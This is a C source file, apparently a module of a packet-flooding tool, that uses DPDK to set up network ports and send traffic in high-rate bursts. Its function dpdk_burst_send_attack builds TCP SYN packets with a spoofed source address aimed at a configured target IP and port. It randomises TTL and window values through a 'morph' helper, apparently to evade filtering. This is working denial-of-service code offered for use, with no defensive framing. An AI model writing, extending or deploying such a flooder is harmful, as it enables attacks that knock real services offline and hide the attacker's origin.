#include <rte_eal.h>
#include <rte_ethdev.h>
#include <rte_mbuf.h>
#include <rte_mempool.h>
#include <rte_ip.h>
#include <rte_tcp.h>
#include <rte_udp.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

#include "../include/dpdk_handler.h"
#include "../include/engine.h"
#include "../include/protocol_morph.h"

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"

static struct dpdk_config_t g_dpdk_cfg;

int dpdk_init(int argc, char **argv)
{
    int ret;

    ret = rte_eal_init(argc, argv);
    if (ret < 0) {
        fprintf(stderr, "dpdk_init: rte_eal_init() failed: %d\n", ret);
        return -1;
    }

    memset(&g_dpdk_cfg, 0, sizeof(g_dpdk_cfg));

    uint16_t nb_ports = rte_eth_dev_count_avail();
    if (nb_ports == 0) {
        fprintf(stderr, "dpdk_init: no available DPDK ports\n");
        return -1;
    }

    g_dpdk_cfg.port_count = (int)nb_ports > 16 ? 16 : (int)nb_ports;
    g_dpdk_cfg.lcore_count = rte_lcore_count();
    g_dpdk_cfg.mempool_size = 8192;
    g_dpdk_cfg.cache_size = 256;

    for (int i = 0; i < g_dpdk_cfg.port_count; i++) {
        struct dpdk_pool_t *pool = &g_dpdk_cfg.ports[i];
        char pool_name[32];

        pool->port_id = (uint16_t)i;
        pool->nb_rxd = 512;
        pool->nb_txd = 512;
        pool->burst_size = 64;
        pool->total_sent = 0;

        snprintf(pool_name, sizeof(pool_name), "mbuf_pool_%d", i);

        if (dpdk_port_init(pool, pool_name) != 0) {
            fprintf(stderr, "dpdk_init: port %d init failed\n", i);
            return -1;
        }
    }

    return 0;
}

EXPORT
int dpdk_init_from_config(struct dpdk_config_t *cfg)
{
    int ret;

    if (!cfg)
        return -1;

    memcpy(&g_dpdk_cfg, cfg, sizeof(g_dpdk_cfg));

    ret = rte_eal_init(0, NULL);
    if (ret < 0) {
        fprintf(stderr, "dpdk_init_from_config: rte_eal_init() failed: %d\n",
                ret);
        memset(&g_dpdk_cfg, 0, sizeof(g_dpdk_cfg));
        return -1;
    }

    uint16_t nb_ports = rte_eth_dev_count_avail();
    if (nb_ports == 0) {
        fprintf(stderr, "dpdk_init_from_config: no DPDK ports\n");
        return -1;
    }

    if (cfg->port_count > (int)nb_ports)
        cfg->port_count = (int)nb_ports;

    if (cfg->port_count > 16)
        cfg->port_count = 16;

    g_dpdk_cfg.port_count = cfg->port_count;

    for (int i = 0; i < cfg->port_count; i++) {
        struct dpdk_pool_t *pool = &cfg->ports[i];
        char pool_name[32];

        pool->port_id = (uint16_t)i;
        pool->nb_rxd = 512;
        pool->nb_txd = 512;
        pool->burst_size = cfg->ports[i].burst_size > 0
                               ? cfg->ports[i].burst_size
                               : 64;
        pool->total_sent = 0;

        snprintf(pool_name, sizeof(pool_name), "mbuf_pool_%d", i);

        if (dpdk_port_init(pool, pool_name) != 0) {
            fprintf(stderr, "dpdk_init_from_config: port %d init failed\n",
                    i);
            return -1;
        }
    }

    return 0;
}

int dpdk_port_init(struct dpdk_pool_t *pool, const char *pool_name)
{
    struct rte_eth_conf port_conf;
    struct rte_eth_dev_info dev_info;
    int ret;

    if (!pool || !pool_name)
        return -1;

    memset(&port_conf, 0, sizeof(port_conf));
    port_conf.rxmode.max_lro_pkt_size = RTE_ETHER_MAX_LEN;

    ret = rte_eth_dev_info_get(pool->port_id, &dev_info);
    if (ret != 0) {
        fprintf(stderr, "dpdk_port_init: rte_eth_dev_info_get(%u) failed: %d\n",
                pool->port_id, ret);
        return -1;
    }

    ret = rte_eth_dev_configure(pool->port_id, 1, 1, &port_conf);
    if (ret != 0) {
        fprintf(stderr, "dpdk_port_init: rte_eth_dev_configure(%u) failed: %d\n",
                pool->port_id, ret);
        return -1;
    }

    pool->mbuf_pool = rte_pktmbuf_pool_create(
        pool_name,
        g_dpdk_cfg.mempool_size > 0 ? g_dpdk_cfg.mempool_size : 8192,
        g_dpdk_cfg.cache_size > 0 ? g_dpdk_cfg.cache_size : 256,
        0,
        RTE_MBUF_DEFAULT_BUF_SIZE,
        rte_socket_id());

    if (!pool->mbuf_pool) {
        fprintf(stderr, "dpdk_port_init: rte_pktmbuf_pool_create(%s) failed\n",
                pool_name);
        return -1;
    }

    ret = rte_eth_rx_queue_setup(pool->port_id, 0, pool->nb_rxd,
                                 rte_eth_dev_socket_id(pool->port_id),
                                 NULL, pool->mbuf_pool);
    if (ret != 0) {
        fprintf(stderr, "dpdk_port_init: rte_eth_rx_queue_setup(%u) failed: %d\n",
                pool->port_id, ret);
        return -1;
    }

    ret = rte_eth_tx_queue_setup(pool->port_id, 0, pool->nb_txd,
                                 rte_eth_dev_socket_id(pool->port_id),
                                 NULL);
    if (ret != 0) {
        fprintf(stderr, "dpdk_port_init: rte_eth_tx_queue_setup(%u) failed: %d\n",
                pool->port_id, ret);
        return -1;
    }

    ret = rte_eth_dev_start(pool->port_id);
    if (ret != 0) {
        fprintf(stderr, "dpdk_port_init: rte_eth_dev_start(%u) failed: %d\n",
                pool->port_id, ret);
        return -1;
    }

    rte_eth_promiscuous_enable(pool->port_id);

    return 0;
}

EXPORT
uint64_t dpdk_burst_send_attack(struct dpdk_pool_t *pool,
                                struct attack_config_t *cfg,
                                int burst_size)
{
    struct rte_mbuf *bufs[256];
    uint16_t sent_count = 0;
    uint64_t total_bytes = 0;
    int i;

    if (!pool || !cfg || burst_size <= 0)
        return 0;

    if (burst_size > 256)
        burst_size = 256;

    for (i = 0; i < burst_size; i++) {
        struct rte_mbuf *mbuf = rte_pktmbuf_alloc(pool->mbuf_pool);
        if (!mbuf)
            break;

        uint32_t pkt_len = sizeof(struct rte_ether_hdr) +
                           sizeof(struct rte_ipv4_hdr) +
                           sizeof(struct rte_tcp_hdr);
        char *data = rte_pktmbuf_append(mbuf, pkt_len);
        if (!data) {
            rte_pktmbuf_free(mbuf);
            continue;
        }

        struct rte_ether_hdr *eth = (struct rte_ether_hdr *)data;
        struct rte_ipv4_hdr *ip = (struct rte_ipv4_hdr *)(eth + 1);
        struct rte_tcp_hdr *tcp = (struct rte_tcp_hdr *)(ip + 1);

        memset(eth, 0, sizeof(*eth));
        memset(ip, 0, sizeof(*ip));
        memset(tcp, 0, sizeof(*tcp));

        rte_eth_macaddr_get(pool->port_id, &eth->dst_addr);
        rte_eth_macaddr_get(pool->port_id, &eth->src_addr);
        eth->ether_type = rte_cpu_to_be_16(RTE_ETHER_TYPE_IPV4);

        ip->version_ihl = 0x45;
        ip->type_of_service = 0;
        ip->total_length = rte_cpu_to_be_16(pkt_len - sizeof(*eth));
        ip->packet_id = rte_cpu_to_be_16((uint16_t)(rand() & 0xFFFF));
        ip->fragment_offset = 0;
        ip->time_to_live = morph_random_ttl();
        ip->next_proto_id = IPPROTO_TCP;
        ip->dst_addr = cfg->target_ip;
        ip->src_addr = cfg->spoof_ip;

        ip->hdr_checksum = 0;
        ip->hdr_checksum = rte_ipv4_cksum(ip);

        tcp->src_port = (uint16_t)(rand() & 0xFFFF);
        tcp->dst_port = cfg->target_port;
        tcp->sent_seq = rte_cpu_to_be_32((uint32_t)(rand()));
        tcp->ack_seq = 0;
        tcp->data_off = (sizeof(*tcp) >> 2) << 4;
        tcp->tcp_flags = RTE_TCP_SYN_FLAG;
        tcp->rx_win = rte_cpu_to_be_16(morph_random_window());
        tcp->cksum = 0;
        tcp->tcp_urp = 0;

        struct rte_ipv4_hdr ip_copy;
        memcpy(&ip_copy, ip, sizeof(ip_copy));
        ip_copy.hdr_checksum = 0;
        ip_copy.total_length = rte_cpu_to_be_16(
            rte_cpu_to_be_16(ip->total_length));

        uint32_t pseudo_sum = rte_ipv4_phdr_cksum(&ip_copy, 0);
        tcp->cksum = rte_ipv4_udptcp_cksum(&ip_copy, (void *)tcp);

        bufs[sent_count++] = mbuf;
        total_bytes += pkt_len;
    }

    if (sent_count > 0) {
        uint16_t tx_ret = rte_eth_tx_burst(pool->port_id, 0, bufs, sent_count);

        for (i = tx_ret; i < sent_count; i++)
            rte_pktmbuf_free(bufs[i]);

        if (tx_ret < sent_count)
            total_bytes = (total_bytes * tx_ret) / sent_count;
    }

    pool->total_sent += sent_count;
    return total_bytes;
}

EXPORT
uint16_t dpdk_burst_send(uint16_t port_id, struct rte_mbuf **pkts,
                         uint16_t nb_pkts)
{
    if (!pkts || nb_pkts == 0)
        return 0;

    return rte_eth_tx_burst(port_id, 0, pkts, nb_pkts);
}

EXPORT
uint64_t dpdk_burst_send_multi(struct rte_mbuf ***pkts,
                               uint16_t *nb_each)
{
    uint64_t total = 0;

    if (!pkts || !nb_each)
        return 0;

    for (int i = 0; i < g_dpdk_cfg.port_count; i++) {
        if (pkts[i] && nb_each[i] > 0) {
            total += dpdk_burst_send((uint16_t)i, pkts[i], nb_each[i]);
        }
    }

    return total;
}

EXPORT
int dpdk_stats_get(uint16_t port_id, uint64_t *pkts_out,
                   uint64_t *bytes_out)
{
    struct rte_eth_stats stats;

    if (port_id >= 16 || !pkts_out || !bytes_out)
        return -1;

    if (rte_eth_stats_get(port_id, &stats) != 0)
        return -1;

    *pkts_out = stats.opackets;
    *bytes_out = stats.obytes;
    return 0;
}

EXPORT
void dpdk_cleanup(void)
{
    for (int i = 0; i < g_dpdk_cfg.port_count; i++) {
        rte_eth_dev_stop(g_dpdk_cfg.ports[i].port_id);
        rte_eth_dev_close(g_dpdk_cfg.ports[i].port_id);
    }

    rte_eal_cleanup();
}

#pragma GCC diagnostic pop
